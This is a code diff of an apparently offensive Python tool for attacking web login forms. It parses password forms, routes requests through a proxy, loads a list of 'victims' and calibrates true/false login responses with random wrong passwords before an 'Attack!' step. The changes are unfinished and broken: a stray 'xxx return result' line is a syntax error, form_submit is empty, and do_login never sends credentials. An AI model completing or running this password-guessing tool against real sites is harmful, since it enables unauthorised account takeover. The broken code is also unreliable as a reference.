@@ -1,12 +1,13 @@
 import colored  #-- See: https://pypi.org/project/colored/
 from html.parser import HTMLParser
 import os
+import random
 import requests
 import sys
 import time
 
 
-#================================================================================================[ GLOBAL CONSTANTS ]==
+#=================================================================================================[ GLOBAL CONSTANTS ]==
 VERSION = "0.9.0"
 SPLASH = """
           )             )                            
@@ -20,7 +21,7 @@ SPLASH = """
                           |__/                       
 {}\n\n""".format("(v{})".format(VERSION).rjust(50))
 
-#----------------------------------------------------------------------------------------------------------------------
+#-----------------------------------------------------------------------------------------------------------------------
 VERIFY = 3
 
 DEFAULT_VERBOSITY = 3   # ( FAIL:0, INFO:1, WARN:2, DEBUG:3 )
@@ -59,7 +60,7 @@ CMD_LN = {
 }
 
 
-#==================================================================================================[ CONSOLE OUTPUT ]==
+#=========================================================================================================[ CLASSES ]==
 USE_COLOR = not "-plain" in sys.argv
 
 class Print():
@@ -184,9 +185,7 @@ class Print():
             print(splash)
 
 
-#def print_splash():
-
-#=========================================================================================================[ CLASSES ]==
+#-----------------------------------------------------------------------------------------------------------------------
 class HtmlForms(HTMLParser):
     """ Extension for the HTMLParser to extract forms automatically.
         ref:  https://docs.python.org/3/library/html.parser.html
@@ -255,7 +254,7 @@ class HtmlForms(HTMLParser):
         return
 
 
-#----------------------------------------------------------------------------------------------------------------------
+#-----------------------------------------------------------------------------------------------------------------------
 class HtmlStrings(HTMLParser):
     """ Extension for the HTMLParser that just extracts all the strings.
         ref:  https://docs.python.org/3/library/html.parser.html
@@ -291,7 +290,7 @@ class HtmlStrings(HTMLParser):
             print("Encountered some data  :", data)
 
 
-#----------------------------------------------------------------------------------------------------------------------
+#-----------------------------------------------------------------------------------------------------------------------
 class Commandline():
 
 
@@ -338,8 +337,8 @@ class Commandline():
                 self.help("The argument '{}' expects {} parameters but got {}.".format(key, length, len(unparsed) - 1))
             else:
                 values = True if length == 0 else unparsed[1:length + 1]
-                #self.PRINT.debug("{}: ['{}']".format(key.rjust(8), "', '".join(values)))
                 if not values is True:
+                    self.PRINT.debug("Command line arg -> {}: ['{}']".format(key.rjust(8), "', '".join(values)))
                     for i in range(len(values)):
                         cast = CMD_LN[key][0][i]
                         try:
@@ -358,6 +357,7 @@ class Commandline():
         else:
             #-- Show help and exit
             self.help("Unknown arg '{}'.".format(unparsed[0]))
+
         return unparsed, valid_keys
 
 
@@ -428,7 +428,7 @@ class Commandline():
         exit(0)
 
 
-#=========================================================================================================[ METHODS ]==
+#==========================================================================================================[ METHODS ]==
 def is_online() -> bool:
     """ Returns True if google is reachable
     """
@@ -464,27 +464,66 @@ def print_ips(f_badssl, proxy):
 def form_get(url : str, proxy, ignore_ssl_errors : bool) -> tuple:
     """ Gets the HTML form from a given page
     """
+    result = None
+
+    try:
+        r = requests.get(args.get("-url")[0], proxies=proxy, verify=ignore_ssl_errors)
+        f = HtmlForms(r.text)
+        PRINT.debug(str(f.password_forms[0]))
+        result = f.password_forms
+
+    except:
+        result = False
+
+    return result
 
 
-def form_submit(form : tuple, proxy, ignore_ssl_errors : bool, **kwargs) -> tuple:
+def form_submit(form : tuple, ignore_ssl_errors : bool, proxy : tuple, **kwargs) -> tuple:
     """ Submits an HTML form and retuens the headers, cookies and response body as a tuple(dict, dict, str).
     """
 
+def do_login(url : str, username : str, password : str, ignore_ssl_errors : bool, proxy : tuple) -> str:
+    """ Gets the http form and performs a login. """
+    result = None
+    PRINT.debug(f"Performing login for '{username}' with password '{password}'...")
+    
+    #-- Get the login form
+    PRINT.debug("Getting HTML form from '{url}'...", 1)
+    form = form_get(url, proxy, ignore_ssl_errors)
+    if form is None:
+        PRINT.debug("Error getting form.")
+    else:
+        PRINT.debug(str(form))
+        result = form
 
-def get_test_data(test_user : tuple, url : str, ignore_ssl_errors : bool, proxy : tuple) -> list:
+    xxx return result
+
+def get_test_data(url : str, test_user : tuple, verify_count : int, ignore_ssl_errors : bool, proxy : tuple) -> list:
     """ If a test-user is provided, return a list containing [[GOOD], [BAD]] login results. """
     result = None
 
     if not test_user is None:
         #-- Perform test submissions
-        L = list()
-        for i in range(VERIFY):
-            r = requests.get(args.get("-url")[0], proxies=proxy, verify=ignore_ssl_errors)
-            f = HtmlForms(r.text)
-            print(f.password_forms[0])
-            L.append(f.password_forms)
+        result = [[], []]
+
+        #-- Perform test submissions
+        P = list()
+        while len(result[0]) < verify_count:
+            #-- Generate bad password
+            badpass = None
+            while (badpass is None) or (badpass == test_user[1])  or (badpass in P):
+                badpass = ""
+                for i in range(8):
+                    badpass = badpass + random.choice("abcdefghijklmnopqrstuvwxyz")
+            P.append(badpass)
+
+            #-- Do bad login
+            result[1].append(do_login(url, test_user[0], badpass, ignore_ssl_errors, proxy))
+
+            #-- Do good login
+            result[0].append(do_login(url, test_user[0], test_user[1], ignore_ssl_errors, proxy))
     else:
-        PRINT.debug("The -test flag has not been set")
+        PRINT.debug("The -test flag has not been set.")
 
     return result
 
@@ -641,7 +680,8 @@ def get_victims(single_victim, victim_file):
     #-- Result
     return hit_list
 
-#============================================================================================================[ MAIN ]==
+
+#=============================================================================================================[ MAIN ]==
 #   - https://kushaldas.in/posts/using-python-to-access-onion-network-over-socks-proxy.html
 
 args = Commandline("-h", "-H", USE_COLOR, DEFAULT_VERBOSITY)
@@ -677,7 +717,7 @@ if is_online():
     elif args.is_set("-url"):
         #-- Prepare for an attack
         hit_list = get_victims(args.get("-u"), args.get("-U"))
-        test_data = get_test_data(args.get("-test"), args.get("-url"), f_badssl, proxy)
+        test_data = get_test_data(args.get("-url"), args.get("-test"), VERIFY, f_badssl, proxy)
         str_true, str_false = get_truefalse(args.get("-true"), args.get("-false"), test_data)
 
         #-- Attack!
